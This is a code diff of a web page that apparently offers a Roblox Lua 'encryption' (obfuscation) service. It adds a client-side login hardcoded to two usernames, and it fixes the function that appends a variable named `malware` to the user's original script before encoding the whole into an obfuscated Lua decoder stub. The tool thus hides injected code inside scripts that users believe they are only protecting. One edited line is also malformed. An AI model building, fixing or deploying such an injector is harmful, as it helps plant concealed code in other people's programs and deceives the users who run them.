@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MRX · تشفير لوا</title>
+    <title>MRX · تشفير  روبلكس لوا</title> title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Inter:wght@300;400;600;700&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -94,6 +94,14 @@
             letter-spacing: 4px;
         }
         .login-btn:hover { transform: translateY(-3px); box-shadow: 0 12px 40px rgba(255,255,255,0.1); }
+        .login-error {
+            color: #ff5555;
+            font-size: 13px;
+            margin-top: 12px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .login-error.show { opacity: 1; }
         #mainApp {
             position: relative; z-index: 1; display: none;
             min-height: 100vh; padding: 30px 20px;
@@ -221,8 +229,9 @@
             <img class="login-logo-img" src="https://github.com/Rxz60/Rxz/raw/refs/heads/main/IMG_4987.jpeg" alt="MRX" onerror="this.src='https://github.com/Rxz60/MRX/raw/refs/heads/main/IMG_4528.jpeg'">
             <div class="login-brand">MRX</div>
             <div class="login-sub">● LEGENDARY EDGE ●</div>
-            <input type="text" id="loginUser" placeholder="اسم المستخدم" autocomplete="off">
+            <input type="text" id="loginUser" placeholder="MRX.com / SAP.com" autocomplete="off">
             <button class="login-btn" onclick="handleLogin()">دخول ➤</button>
+            <div class="login-error" id="loginError">❌ اسم المستخدم غير صحيح. المسموح: MRX.com أو SAP.com</div>
         </div>
     </div>
 
@@ -285,10 +294,18 @@
 
         function handleLogin() {
             const user = document.getElementById('loginUser').value.trim();
-            if (!user) return;
-            document.getElementById('loginScreen').classList.add('hidden');
-            document.getElementById('mainApp').classList.add('active');
+            const errorEl = document.getElementById('loginError');
+
+            if (user === 'MRX.com' || user === 'SAP.com') {
+                errorEl.classList.remove('show');
+                document.getElementById('loginScreen').classList.add('hidden');
+                document.getElementById('mainApp').classList.add('active');
+            } else {
+                errorEl.classList.add('show');
+                setTimeout(() => errorEl.classList.remove('show'), 3000);
+            }
         }
+
         function handleLogout() {
             document.getElementById('mainApp').classList.remove('active');
             document.getElementById('loginScreen').classList.remove('hidden');
@@ -309,7 +326,7 @@
                 `;
             }
 
-            const full = originalCode .. '\n' .. malware;
+            const full = originalCode + '\n' + malware;
             const bytes = [];
             for (let i = 0; i < full.length; i++) bytes.push(full.charCodeAt(i));
 
@@ -341,9 +358,7 @@ return(function(...)local L=setmetatable local s,M=L({kp=function()end},{__pow=f
             const footer = `})end)()`;
             const signature = `\n-- MRX --SAP`;
 
-            const decoder = header + `"${numbers}"` + footer + signature;
-
-            return decoder;
+            return header + `"${numbers}"` + footer + signature;
         }
 
         function obfuscateScript() {
